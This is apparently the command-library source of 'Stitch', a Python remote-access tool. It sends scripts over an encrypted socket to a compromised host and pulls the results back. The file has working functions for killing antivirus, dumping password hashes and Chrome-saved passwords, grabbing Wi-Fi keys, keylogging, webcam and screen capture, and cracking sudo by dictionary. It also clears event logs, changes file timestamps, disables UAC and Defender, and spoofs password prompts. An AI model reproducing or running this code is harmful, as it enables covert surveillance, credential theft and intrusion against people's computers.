#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_help import *
from stitch_utils import *

def st_recvall(client, count, aes_enc=None, encryption=True):
    buf = b''
    while count:
        newbuf = client.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    if not encryption:
        return buf
    else:
        return decrypt(buf, aes_enc)

def st_receive(client,aes_enc):
    full_response = ""
    while True:
        lengthbuf = st_recvall(client, 4, encryption=False)
        length, = struct.unpack('!i', lengthbuf)
        response = st_recvall(client, length, aes_enc)
        if response != st_eof:
            full_response += response
        else:
            break
    return full_response

def st_send(client, data, aes_enc):
    while data:
        cmd = encrypt(data[:1024], aes_enc)
        length = len(cmd)
        client.sendall(struct.pack('!i', length))
        client.sendall(cmd)
        data = data[1024:]
    eof = encrypt(st_eof, aes_enc)
    eof_len = len(eof)
    client.sendall(struct.pack('!i', eof_len))
    client.sendall(eof)

class stitch_commands_library:
    __slots__= ['client', 'cli_target', 'cli_port', 'cli_os','cli_platform',
                'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp',]

    def __init__(self, client, target, port, aes_key, os, platform, hostname, user, dwld, temp):
        self.client = client
        self.cli_target = target
        self.cli_port = port
        self.aes_key = aes_key
        self.cli_os = os
        self.cli_platform = platform
        self.cli_hostname = hostname
        self.cli_user = user
        self.cli_dwld = dwld
        self.cli_temp = temp
        if self.cli_os.startswith('win'):
            self.cli_hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
        else:
            self.cli_hosts_file = '/etc/hosts'

    def history_check(self):
        self.Config = ConfigParser.ConfigParser()
        self.Config.read(hist_ini)
        self.cfgfile = open(hist_ini,'wb')
        if self.cli_target not in self.Config.sections():
            self.Config.add_section(self.cli_target)
            st_log.info('Connected to {} for the very first time'.format(self.cli_target))
        self.Config.set(self.cli_target,'port',self.cli_port)
        self.Config.set(self.cli_target,'user', self.cli_user)
        self.Config.set(self.cli_target,'os',self.cli_platform)
        self.Config.set(self.cli_target,'hostname', self.cli_hostname)
        self.Config.write(self.cfgfile)
        self.cfgfile.close()
        if not os.path.exists(os.path.join(downloads_path, self.cli_target)):
            os.mkdir(os.path.join(downloads_path, self.cli_target))

    def is_alive(self, line):
        if not line.startswith('cls') and not line.startswith('clear'):
            try:
                self.send('echo hello')
                self.receive()
            except Exception as e:
                st_print("[!] Connection has been lost.")
                st_log.error('Exception:\n{}'.format(str(e)))
                return False
        return True

    def receive(self): return st_receive(self.client,self.aes_key)

    def send(self, data): return st_send(self.client,data,self.aes_key)

################################################################################
#                        Start of COMMON LIB Section                           #
################################################################################

    def avscan(self):
        st_print("=== Antivirus Scan ===")
        if windows_client(system=self.cli_os):
            self.pyexec('avscan_win.py',pylib=True)
            st_print("    {}".format(self.receive()))
            st_print("    {}".format(self.receive()))
        else:
            self.pyexec('avscan_posix.py',pylib=True)
            st_print("    {}".format(self.receive()))

    def avkill(self):
        self.pyexec('avkiller.py',pylib=True)
        st_print(self.receive())

    def cat(self, f_name):
        self.pyexec('cat.py',pylib=True)
        self.send(f_name)
        response = ''
        response=self.receive()
        if no_error(response):
            response=self.receive()
            print '\n{}'.format(response),
            while response != st_complete:
                response=self.receive()
                if response != st_complete:
                    print '\b'+ response,
                else:
                    print "\n"
                    break
        else:
            st_print(response)

    def cd(self, path):
        if path:
            self.pyexec('cd.py',pylib=True)
            self.send(path)
            response=self.receive()
            if not no_error(response):
                st_print(response)
            else:
                print
        else:
            self.pwd()

    def clear(self):
        clear_screen()
        st_print('[+] Current Session: {}\n\n'.format(self.cli_target))

    def crackpassword(self):
        with open(os.path.join(tools_path, 'passwords.txt'),'r') as pw:
            password_list = pw.readlines()
        cracked = False
        self.pyexec('crackpassword.py',pylib=True)
        st_print('[*] Attempting to crack the sudo password...')
        for n in password_list:
            n = n.strip()
            resp = self.receive()
            if 'sudo_failed' in resp:
                st_print('[*] Currently running with sudo privileges, unable to start dictionary attack.\n')
                return
            if 'sudo_success' in resp:
                self.send(n)
                resp = self.receive()
                if 'password_failed' in resp:
                    st_print('[-] {}'.format(n))
                if 'password_cracked' in resp:
                    st_print('[+] Password: {}'.format(n))
                    st_logger(n,self.cli_dwld,'sudo_password')
                    cracked = True
                    break
        if not cracked:
            resp = self.receive()
            self.send('password_list_failed')
            st_print('[!] Failed to crack the sudo password.\n')


    def displayoff(self):
        self.pyexec('displayoff.py',pylib=True)
        st_print(self.receive())

    def displayon(self):
        self.pyexec('displayon.py',pylib=True)
        st_print(self.receive())

    def download(self, f_name):
        self.pyexec('download.py',pylib=True)
        dwld = f_name.split()
        dwld_contents = ''
        d_file = ''
        d = ''
        if not os.path.exists(self.cli_dwld):
            os.mkdir(self.cli_dwld)
        if len(dwld) > 0:
            st_print('[*] Beginning download of {}...'.format(f_name))
            if f_name.endswith('\\') or f_name.endswith('/'):
                d_file = f_name[:-1]
                d_file = os.path.basename(d_file)
                if not d_file:
                    d_file = f_name[:-1]
            else:
                d_file = os.path.basename(f_name)
                if not d_file:
                    d_file = f_name
            d_file = d_file.replace('\\','').replace('/','')
            if '.' in d_file and not d_file.startswith('.'):
                extension = d_file.index('.')
                d_file = d_file[:extension]
            d_zip = "{}-{}.zip".format(self.cli_user,d_file)
            downld = os.path.join(self.cli_dwld,d_zip)
            i = 1
            while os.path.exists(downld):
                d_zip = "{}-{} ({}).zip".format(self.cli_user,d_file,i)
                downld = os.path.join(self.cli_dwld,d_zip)
                i += 1
            self.send(f_name)
            size = self.receive()
            if no_error(size):
                if check_int(size):
                    download_bar = progress_bar(size)
                    download_bar.file_info()
                    with open(downld,'wb') as my_download:
                        while d != 'download complete':
                            d = self.receive()
                            if not no_error(d):
                                self.send('exit')
                                st_print('[!] %s\n' %d)
                                return
                            download_bar.increment()
                            if d != 'download complete':
                                my_download.write(d)
                            else:
                                download_bar.complete()
                    st_print("[+] Download succesful: %s\n" % downld)
                else:
                    st_print('[!] Size of "{}" is not a valid int'.format(size))
            else:
                st_print(size)
        else:
            st_print('[*] Download usage: [download] [filepath]\n')

    def environment(self):
        self.pyexec('environment.py',pylib=True)
        st_print("=== System Environment Variables ===")
        st_print(self.receive())

    def fileinfo(self, f_name):
        if f_name:
            self.pyexec('fileinfo.py',pylib=True)
            self.send(f_name)
            st_print(self.receive())

    def firewall(self, option):
        if option == 'status':
            self.pyexec('fwstatus.py',pylib=True)
            st_print(self.receive())
        elif option == 'open':
            try:
                while True:
                    port = raw_input("\nEnter the desired port: ",)
                    proto = raw_input("Enter desired type [TCP/UDP]: ",)
                    if windows_client(self.cli_os):
                        direction = raw_input("Enter desired direction [IN/OUT]: ",)
                    correct = raw_input("\nOpen {} Port {} going {}? [Y/N]: ".format(proto,port,direction),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            if windows_client(self.cli_os):
                cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(port,direction,direction,proto,port)
            if osx_client(self.cli_os):
                cmd = "sed -i '' -e '$a\pass in proto {} from any to any port = {}' /etc/pf.conf; pfctl -vnf /etc/pf.conf".format(proto,port)
            self.send(cmd)
            st_print(self.receive())
        elif option == 'close':
            try:
                while True:
                    port = raw_input("\nEnter the desired port: ",)
                    proto = raw_input("Enter desired type [TCP/UDP]: ",)
                    if windows_client(self.cli_os):
                        direction = raw_input("Enter desired direction [in/out]: ",)
                    correct = raw_input("\nClose {} Port {} going {}? [y/n]: ".format(proto,port,direction),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            if windows_client(self.cli_os):
                cmd = 'netsh advfirewall firewall delete rule name="NetBios Port {} {}" protocol={} localport={}'.format(port, direction,proto,port)
            if osx_client(self.cli_os):
                cmd = 'pfctl -sr 2>/dev/null | fgrep -v "block drop quick proto {} from any to any port = {}") | pfctl -f - '.format(proto,port)
            self.send(cmd)
            st_print(self.receive())
        elif option == "allow" and windows_client(self.cli_os):
            try:
                while True:
                    prog = raw_input("\nEnter the desired program to allow: ",)
                    rulename = raw_input("Enter the name of the firewall rule: ",)
                    correct = raw_input('\nLet the rule "{}" allow {} through the firewall? [y/n]: '.format(rulename,prog),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('fwallow.py',pylib=True)
            self.send(prog)
            self.send(rulename)
            st_print(self.receive())
        else:
            usage_firewall()

    def hashdump(self):
        if windows_client(system=self.cli_os):
            self.pyexec('hashdump.py',pylib=True)
            resp = self.receive()
            if no_error(resp):
                st_print(resp)
                st_print(self.receive())
                st_print(self.receive())
            else:
                st_print(resp)
        if osx_client(system=self.cli_os):
            self.pyexec('hashdump.py',pylib=True)
            resp = self.receive()
            st_print(resp)
        if linux_client(system=self.cli_os):
            self.pyexec('hashdump.py',pylib=True)
            resp = self.receive()
            st_print(resp)
            if no_error(resp):
                resp = self.receive()
                st_print(resp)
        if no_error(resp):
            st_logger(resp,self.cli_dwld,'hashdump')

    def hide(self,line):
        if line:
            self.pyexec('hide.py',pylib=True)
            self.send(line)
            st_print(self.receive())
        else:
            usage_hide()

    def hostsfile(self,option):
        if option == 'update':
            try:
                while True:
                    hostname = raw_input("\nEnter desired hostname to add to the hosts file: ")
                    ipaddress = raw_input('\nEnter the IP address of "{}": '.format(hostname))
                    correct = raw_input('\nAdd "{}" with IP: {} to the hosts file? [Y/N]: '.format(hostname,ipaddress))
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('hostsupdate.py',pylib=True)
            self.send(hostname)
            self.send(ipaddress)
            st_print(self.receive())
        elif option == 'remove':
            try:
                while True:
                    hostname = raw_input("\nEnter desired hostname to remove from the hosts file: ")
                    correct = raw_input('\nRemove "{}" from the hosts file? [Y/N]: '.format(hostname))
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('hostsremove.py',pylib=True)
            self.send(hostname)
            st_print(self.receive())
        elif option == 'show':
            self.cat(self.cli_hosts_file)
        else:
            usage_hostsfile()

    def ifconfig(self, args):
        if windows_client(system=self.cli_os):
            cmd = 'ipconfig {}'.format(args)
        else:
            cmd = 'ifconfig {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def ipconfig(self, args):
        self.ifconfig(args)

    def keylogger(self, option):
        if option == 'start':
            self.pyexec('kl_start.py',pylib=True)
            st_print(self.receive())
        elif option == 'stop':
            self.pyexec('kl_stop.py',pylib=True)
            st_print(self.receive())
        elif option == 'dump':
            self.pyexec('kl_dump.py',pylib=True)
            resp = self.receive()
            st_print(resp)
            if not resp.startswith('[*]'):
                st_logger(resp,self.cli_dwld,'keylogger')
        elif option == 'status':
            self.pyexec('kl_status.py',pylib=True)
            st_print(self.receive())
        else:
            usage_keylogger()

    def location(self):
        self.pyexec('location.py',pylib=True)
        st_print('=== Location ===')
        st_print(self.receive())

    def lockscreen(self):
        self.pyexec('lockscreen.py',pylib=True)
        st_print(self.receive())

    def ls(self, args):
        if windows_client(system=self.cli_os):
            cmd = 'dir /a {}'.format(args)
        else:
            cmd = 'ls -alh {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def lsmod(self, args):
        if windows_client(system=self.cli_os):
            cmd = 'driverquery {}'.format(args)
        elif linux_client(system=self.cli_os):
            cmd = 'lsmod {}'.format(args)
        elif osx_client(system=self.cli_os):
            cmd = 'kextstat {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def more(self, args):
        if args:
            self.cat(args)
        else:
            usage_more()

    def popup(self):
        try:
            while True:
                message = raw_input("\nMessage to be displayed in popup: ")
                correct = raw_input('\nDisplay a popup saying "{}" ? [Y/N]: '.format(message))
                if correct.lower().startswith('y'):
                    break
        except KeyboardInterrupt:
            print '\n'
            return
        self.pyexec('popup.py',pylib=True)
        self.send(message)
        st_print(self.receive())

    def pwd(self):
        if windows_client(system=self.cli_os):
            self.send('cd')
        else:
            self.send('pwd')
        st_print(self.receive())

    def ps(self,args):
        if windows_client(system=self.cli_os):
            cmd = 'tasklist {}'.format(args)
        else:
            cmd = 'ps {}'.format(args)
        self.send(cmd)
        st_print(self.receive())

    def pyexec(self, f_name, pylib=False):
        code = ''
        cur_dir = os.getcwd()
        py_file = f_name.strip()
        if py_file != '':
            if pylib:
                dir_path = pylib_path
                py_file_path = os.path.join(pylib_path,py_file)
            else:
                dir_path = uploads_path
                py_file_path = os.path.join(uploads_path,py_file)
            if os.path.exists(py_file_path):
                if not py_file.endswith('.py') or os.path.isdir(py_file_path):
                    st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                    return
                with open(py_file_path,'rb') as c:
                    for line in c.readlines():
                        code += line
                if pylib:
                    if not f_name == 'get_path.py':
                        st_log.info('Sending {} code from {}'.format(self.cli_target, f_name))
                    self.send('pylib'+ code)
                else:
                    self.send('pyexec'+ code)
                    st_print(self.receive())
            else:
                st_print('[!] %s is not located in %s.\n' % (py_file,dir_path))
        else:
            st_print('[!] File name is required.\n')

    def screenshot(self):
        self.pyexec('screenshot.py',pylib=True)
        st_print(self.receive())
        sc = os.path.join(self.cli_temp,'fs.jpg')
        self.download(sc)
        if windows_client(system=self.cli_os):
            cmd = 'del {}'.format(sc)
        else:
            cmd = 'rm -f {}'.format(sc)
        self.send(cmd)
        self.receive()

    def sysinfo(self):
        self.pyexec('sysinfo.py',pylib=True)
        st_print('=== System info ===')
        st_print(self.receive())

    def touch(self, f_name):
        if windows_client(system=self.cli_os):
            cmd = 'if not exist {} type NUL > {}'.format(f_name,f_name)
        else:
            cmd = 'touch {}'.format(f_name)
        self.send(cmd)
        st_print(self.receive())

    def unhide(self,line):
        if line:
            self.pyexec('unhide.py',pylib=True)
            self.send(line)
            st_print(self.receive())
        else:
            usage_unhide()

    def upload(self, f_name, to_cwd=True):
        if to_cwd:
            self.pyexec('upload.py',pylib=True)
        u_file = f_name.strip('\\/')
        if '.' in u_file and not u_file.startswith('.'):
            extension = u_file.index('.')
            u_base = u_file[:extension]
            u_zip = "{}.zip".format(u_base)
        else:
            u_zip = "{}.zip".format(u_file)
        self.send(u_zip)
        content = ''
        cur_dir = os.getcwd()
        if u_file != '':
            u_file_path = os.path.join(uploads_path,u_file)
            if os.path.exists(u_file_path):
                os.chdir(uploads_path)
                u_zip_path = os.path.join(stitch_temp_path, u_zip)
                if os.path.isdir(u_file):
                    zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                    zipdir(u_file,zipf)
                    zipf.close()
                else:
                    zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                    zipf.write(u_file)
                    zipf.close()
                st_print("[*] Beginning upload of {}...".format(u_file))
                size =os.stat(u_zip_path)
                size = size.st_size
                upload_bar = progress_bar(size)
                upload_bar.file_info()
                with open (u_zip_path, 'rb') as upload:
                    line = upload.read(1024)
                    while line:
                        self.send(line)
                        upload_bar.increment()
                        line = upload.read(1024)
                upload_bar.complete()
                self.send('upload complete')
                os.remove(u_zip_path)
                st_print(self.receive())
            else:
                st_print('[!] {} is not located in {}.\n'.format(u_file,uploads_path))
                self.send("ERROR")

    def vmscan(self):
        self.pyexec('vmscan.py',pylib=True)
        st_print(self.receive())

    def webcamsnap(self, cam_dev):
        self.pyexec('webcamSnap.py',pylib=True)
        if cam_dev:
            self.send(cam_dev)
        else:
            if windows_client(system=self.cli_os):
                self.send("0")
            else:
                self.send('st_continue')
        if not windows_client(system=self.cli_os):
            upload_imgsnap = self.receive()
            if upload_imgsnap == 'upload_imgsnap':
                shutil.copy(imagesnap,os.path.join(uploads_path,'.st_imsnp'))
                self.upload('.st_imsnp', to_cwd=False)
                os.remove(os.path.join(uploads_path,'.st_imsnp'))
        resp = self.receive()
        if no_error(resp):
            st_print(resp)
            sc = os.path.join(self.cli_temp,'wb.jpg')
            self.download(sc)
            if windows_client(system=self.cli_os):
                cmd = 'del {}'.format(sc)
            else:
                cmd = 'rm -f {}'.format(sc)
            self.send(cmd)
            self.receive()
        else:
            st_print(resp)

    def webcamlist(self):
        self.pyexec('webcamList.py',pylib=True)
        resp = self.receive()
        if windows_client(system=self.cli_os):
            st_print(resp)
            if no_error(resp):
                st_print(self.receive())
        else:
            if resp == 'upload_imgsnap':
                shutil.copy(imagesnap,os.path.join(uploads_path,'.st_imsnp'))
                self.upload('.st_imsnp', to_cwd=False)
                os.remove(os.path.join(uploads_path,'.st_imsnp'))
            resp = self.receive()
            st_print(resp)
            if no_error(resp):
                st_print(self.receive())

################################################################################
#                        Start of DISCONNECT Section                           #
################################################################################

    def exit(self, alive=True):
        if alive: self.send("end_connection")
        st_print("[-] Disconnected from {}\n".format(self.cli_target))
        self.client.close()
        return True

    def EOF(self):
        return self.exit()

################################################################################
#                      Start of WINDOWS SPECIFIC Section                       #
################################################################################

    def clearev(self):
        resp = raw_input("\nAre you sure you want to clear the System, Security, and Application event logs? [Y/N]: ")
        if resp.lower().startswith('y'):
            self.pyexec('clearev.py',pylib=True)
            st_print(self.receive())
        else:
            print

    def chromedump(self):
        if windows_client():
            self.pyexec('chromedump.py',pylib=True)
            resp = self.receive()
            if no_error(resp):
                if windows_client(self.cli_os):
                    self.download('C:\\Windows\\Temp\\c_log_626')
                    self.send('del C:\\Windows\\Temp\\c_log_626')
                else:
                    self.download('/tmp/c_log_626')
                    self.send('rm -f /tmp/c_log_626')
                self.receive()
                zip_name = "{}-c_log_626.zip".format(self.cli_user)
                zip_loc = os.path.join(self.cli_dwld, zip_name)
                chrome_path = os.path.join(self.cli_dwld,'c_log_626')
                if os.path.exists(zip_loc):
                    with zipfile.ZipFile(zip_loc, "r") as z:
                        z.extractall(self.cli_dwld)
                    info_list = ''
                    try:
                        connection = sqlite3.connect(chrome_path)
                        with connection:
                            cursor = connection.cursor()
                            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                            value = v.fetchall()
                        for information in value:
                            password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                            if password:
                                info_list += 'origin_url: {}\nusername: {}\npassword: {}\n\n'.format(information[0],information[1],str(password))
                    except sqlite3.OperationalError, e:
                            e = str(e)
                            connection.close()
                            os.remove(zip_loc)
                            os.remove(chrome_path)
                            if (e == 'database is locked'):
                                st_print('[!] Make sure Google Chrome is not running in the background')
                            elif (e == 'no such table: logins'):
                                st_print('[!] Something is wrong with the database name')
                            elif (e == 'unable to open database file'):
                                st_print('[!] Something is wrong with the database path')
                            else:
                                st_print(e)
                    connection.close()
                    os.remove(zip_loc)
                    os.remove(chrome_path)
                    st_print('=== Chrome Password Dump ===')
                    st_print(info_list)
                    st_logger(info_list,self.cli_dwld,'chromedump')
            else:
                st_print(resp)
        else:
            st_print('[*] Must be running Stitch on a windows machine to use this function.\n')

    def drives(self):
        self.pyexec('drive_finder.py',pylib=True)
        st_print(self.receive())

    def editaccessed(self, f_name):
        if f_name:
            try:
                while True:
                    editfile = f_name
                    edittime = raw_input("Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']: ",)
                    correct = raw_input("\nChange last accessed time of {} to {}? [Y/N]: ".format(editfile,edittime),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('editAccessed.py',pylib=True)
            self.send(editfile)
            self.send(edittime)
            st_print(self.receive())
        else:
            usage_editaccessed()

    def editcreated(self, f_name):
        if f_name:
            try:
                while True:
                    editfile = f_name
                    edittime = raw_input("Enter desired creation time ['MM/DD/YYYY HH:mm:ss']: ",)
                    correct = raw_input("\nChange creation time of {} to {}? [Y/N]: ".format(editfile,edittime),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('editCreation.py',pylib=True)
            self.send(editfile)
            self.send(edittime)
            st_print(self.receive())
        else:
            usage_editcreated()

    def editmodified(self, f_name):
        if f_name:
            try:
                while True:
                    editfile = f_name
                    edittime = raw_input("Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']: ",)
                    correct = raw_input("\nChange last modified time of {} to {}? [Y/N]: ".format(editfile,edittime),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            self.pyexec('editModified.py',pylib=True)
            self.send(editfile)
            self.send(edittime)
            st_print(self.receive())
        else:
            usage_editmodified()

    def enableRDP(self):
        self.pyexec('enableRDP.py',pylib=True)
        st_print(self.receive())

    def enableUAC(self):
        self.pyexec('enableUAC.py',pylib=True)
        st_print(self.receive())

    def enableWindef(self):
        self.pyexec('enableWinDef.py',pylib=True)
        st_print(self.receive())

    def freeze(self, option):
        if option == 'start':
            self.pyexec('freeze_start.py',pylib=True)
            st_print(self.receive())
        elif option == 'stop':
            self.pyexec('freeze_stop.py',pylib=True)
            st_print(self.receive())
        elif option == 'status':
            self.pyexec('freeze_status.py',pylib=True)
            st_print(self.receive())
        else:
            usage_freeze()

    def disableRDP(self):
        self.pyexec('disableRDP.py',pylib=True)
        st_print(self.receive())

    def disableUAC(self):
        self.pyexec('disableUAC.py',pylib=True)
        st_print(self.receive())

    def disableWindef(self):
        self.pyexec('disableWinDef.py',pylib=True)
        st_print(self.receive())

    def scanreg(self):
        self.pyexec('scanReg.py',pylib=True)
        st_print('=== Registry Scan ===')
        st_print(self.receive())

    def wifikeys(self):
        self.pyexec('wifikeys.py',pylib=True)
        st_print('=== System Wifi Keys ===')
        keys = self.receive()
        st_print(keys)
        st_logger(keys,self.cli_dwld,'wifikeys')

################################################################################
#               Start of MAC OS X / LINUX SPECIFIC Section                     #
################################################################################

    def askpassword(self):
        self.pyexec('askpass.py',pylib=True)
        st_print("[*] Waiting for the user's response...")
        resp = self.receive()
        st_print(resp)
        st_logger(resp,self.cli_dwld,'askpassword')

    def logintext(self):
        text = raw_input("Enter text to be displayed on login window: ")
        cmd = "defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"{}\"".format(text)
        self.send(cmd)
        st_print(self.receive())

    def ssh(self):
        try:
            ssh_host = raw_input("\nPlease enter ssh hostname: ")
            if 'exit' in ssh_host:
                print '\n'
                return
            ssh_user = raw_input("\nPlease enter ssh user: ")
            if 'exit' in ssh_user:
                print '\n'
                return
            ssh_pass = getpass("\nPlease enter password for {}: ".format(ssh_user))
        except KeyboardInterrupt:
            print '\n'
            return

        self.pyexec('ssh.py',pylib=True)
        self.send(ssh_user)
        self.send(ssh_host)
        self.send(ssh_pass)

        prompt = self.receive()
        if no_error(prompt):
            while True:
                ssh_cmd=raw_input(prompt)
                if ssh_cmd == 'cls' or ssh_cmd == 'clear':
                    self.clear()
                else:
                    self.send(ssh_cmd)
                    if ssh_cmd == 'exit': break
                    st_print(self.receive())
        else:
            st_print('{}\n'.format(prompt))

    def sudo(self, line):
        self.pyexec('sudo_cmd.py',pylib=True)
        self.send(line)
        resp= self.receive()
        while resp != 'sudo_success':
            if resp == 'Please enter sudo password:':
                su_pass = getpass("\nPlease enter sudo password:")
                self.send(su_pass)
            if resp == 'Sorry incorrect\nPlease enter sudo password:':
                su_pass = getpass("\nSorry incorrect\nPlease enter sudo password:")
                self.send(su_pass)
            if resp == 'sudo: 3 incorrect password attempts':
                st_print('sudo: 3 incorrect password attempts\n')
                return
            resp = self.receive()
        st_print(self.receive())
